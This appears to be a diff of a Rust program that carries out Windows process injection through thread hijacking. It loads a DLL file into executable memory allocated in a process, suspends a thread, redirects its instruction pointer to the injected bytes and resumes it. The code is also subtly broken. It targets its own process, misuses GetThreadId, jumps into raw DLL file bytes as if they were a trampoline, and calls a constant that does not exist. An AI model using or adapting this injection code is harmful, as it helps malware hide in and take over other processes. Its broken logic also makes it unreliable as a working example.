@@ -1,98 +1,143 @@
-use winapi::um::processthreadsapi::{OpenThread, SuspendThread, ResumeThread, GetThreadId, GetThreadContext, SetThreadContext};
-use winapi::um::winnt::{THREAD_GET_CONTEXT, THREAD_SUSPEND_RESUME, CONTEXT, CONTEXT_FULL};
+use std::io::Read;
+use std::fs::File;
+use winapi::ctypes::{c_void, wchar_t};
+use winapi::shared::minwindef::{DWORD, FALSE, ULONG_PTR};
+use winapi::um::processthreadsapi::{GetCurrentProcessId, OpenProcess, OpenThread, SuspendThread, ResumeThread, GetThreadId, GetThreadContext, SetThreadContext};
+use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, CONTEXT, CONTEXT_ALL, THREAD_SUSPEND_RESUME};
 
 fn main() {
-    // Define the target address to jump to
-    let target_addr: usize = 0x00401000;
+    // Get the current process ID
+    let process_id = unsafe { GetCurrentProcessId() };
 
-    // Create a buffer to store the trampoline code
-    let mut trampoline_buf = Vec::new();
-
-    // Write the trampoline code to the buffer
-    trampoline_buf.push(0xE9); // JMP opcode
-    let jump_offset = target_addr.wrapping_sub(trampoline_buf.len() + 5); // Calculate the relative jump offset
-    trampoline_buf.extend_from_slice(&(jump_offset as i32).to_le_bytes()); // Write the jump offset as little-endian bytes
-
-    // Get the current process ID and handle errors
-    let mut process_id = 0;
-    if let Err(e) = GetCurrentProcessIdW(&mut process_id) {
-        println!("Error getting current process ID: {}", e);
+    // Open the target process with necessary access rights
+    let process_handle = unsafe {
+        OpenProcess(
+            PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
+            FALSE,
+            process_id,
+        )
+    };
+    if process_handle.is_null() {
+        eprintln!("Error opening target process.");
         return;
     }
 
-    // Open the target DLL file
-    let mut file = File::open("target.dll").unwrap();
-    let mut dll_bytes = Vec::new();
-    file.read_to_end(&mut dll_bytes).unwrap();
-
-    // Get a handle to the target process (replace this with your process handling logic)
-    let process_handle = match OpenProcessW(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, process_id) {
-        Ok(p) => p,
+    // Open and read the target DLL file
+    let mut file = match File::open("target.dll") {
+        Ok(f) => f,
         Err(e) => {
-            println!("Error opening target process: {}", e);
+            eprintln!("Error opening target DLL file: {}", e);
             return;
         }
     };
 
-    // Allocate memory for the trampoline code within the target process
-    let trampoline_addr = unsafe {
-        let size = trampoline_buf.len();
-        let addr = VirtualAllocEx(
+    let mut dll_bytes = Vec::<u8>::new();
+    if let Err(e) = file.read_to_end(&mut dll_bytes) {
+        eprintln!("Error reading DLL file: {}", e);
+        return;
+    }
+
+    // Allocate memory in the target process for the trampoline code
+    let trampoline_address = unsafe {
+        VirtualAllocEx(
             process_handle,
             std::ptr::null_mut(),
-            size,
+            dll_bytes.len() as DWORD,
             MEM_RESERVE | MEM_COMMIT,
             PAGE_EXECUTE_READWRITE,
-        );
-        if addr.is_null() {
-            panic!("Failed to allocate memory in the target process");
-        }
-        addr as usize
+        )
     };
+    if trampoline_address.is_null() {
+        eprintln!("Failed to allocate memory in the target process");
+        return;
+    }
 
-    // Write the trampoline code to the allocated memory within the target process
-    unsafe {
+    // Write the trampoline code to the allocated memory in the target process
+    let success = unsafe {
         WriteProcessMemory(
             process_handle,
-            trampoline_addr as *mut _,
-            trampoline_buf.as_ptr() as *const _,
-            trampoline_buf.len(),
+            trampoline_address,
+            dll_bytes.as_ptr() as *const c_void,
+            dll_bytes.len(),
             std::ptr::null_mut(),
-        );
-    }
-
-    // Now trampoline code is injected into the target process at trampoline_addr
-
-    // Obtain the handle to the target thread (replace this with your thread handling logic)
-    let thread_handle = unsafe {
-        OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, FALSE, GetThreadId(process_handle))
+        )
     };
-    if thread_handle.is_null() {
-        println!("Failed to obtain thread handle");
+
+    if success == 0 {
+        eprintln!("Failed to write trampoline code to the target process memory");
+        // Cleanup logic if necessary
         return;
     }
 
-    // Suspend the target thread
-    let suspend_count = unsafe { SuspendThread(thread_handle) };
-    if suspend_count == DWORD::MAX {
-        println!("Failed to suspend thread");
+    // Get the main thread ID of the target process
+    let main_thread_id = unsafe {
+        GetThreadId(process_handle)
+    };
+    let main_thread_handle = unsafe {
+        OpenThread(
+            THREAD_SUSPEND_RESUME,
+            FALSE,
+            main_thread_id,
+        )
+    };
+    if main_thread_handle.is_null() {
+        eprintln!("Error opening main thread of the target process");
         return;
     }
 
-    // Read and modify the thread's context
-    let mut context = CONTEXT::default();
-    context.ContextFlags = CONTEXT_FULL;
-    unsafe {
-        GetThreadContext(thread_handle, &mut context);
-        // Modify context.Eip (instruction pointer) to point to your injected code
-        context.Eip = trampoline_addr as DWORD;
-        SetThreadContext(thread_handle, &context);
-    }
-
-    // Resume the thread's execution
-    let resume_count = unsafe { ResumeThread(thread_handle) };
-    if resume_count == DWORD::MAX {
-        println!("Failed to resume thread");
+    // Suspend the main thread of the target process
+    let suspend_count = unsafe {
+        SuspendThread(main_thread_handle)
+    };
+    if suspend_count == DWORD::MAX_VALUE {
+        eprintln!("Error suspending main thread of the target process");
         return;
     }
+
+    // Read the context of the suspended thread
+    let mut context: CONTEXT = unsafe {
+        std::mem::zeroed()
+    };
+    context.ContextFlags = CONTEXT_ALL;
+
+    let success_get_context = unsafe {
+        GetThreadContext(main_thread_handle, &mut context as *mut _)
+    };
+
+    if success_get_context == 0 {
+        eprintln!("Error getting context of the main thread");
+        return;
+    }
+
+    // Update the RIP register in the context to point to the trampoline code
+    if !trampoline_address.is_null() {
+        context.Rip = trampoline_address as ULONG_PTR; // Cast to ULONG_PTR for compatibility
+    } else {
+        eprintln!("Failed to allocate memory in the target process");
+        // Include cleanup logic if necessary
+        return;
+    }
+
+    // Write the updated context back to the main thread
+    let success_set_context = unsafe {
+        SetThreadContext(main_thread_handle, &context as *const _)
+    };
+
+    if success_set_context == 0 {
+        eprintln!("Error setting context of the main thread");
+        return;
+    }
+
+    // Resume the main thread
+    let resume_count = unsafe {
+        ResumeThread(main_thread_handle)
+    };
+
+    if resume_count == DWORD::MAX_VALUE {
+        eprintln!("Error resuming main thread of the target process");
+        return;
+    }
+
+    println!("Injection and manipulation operations completed.");
 }
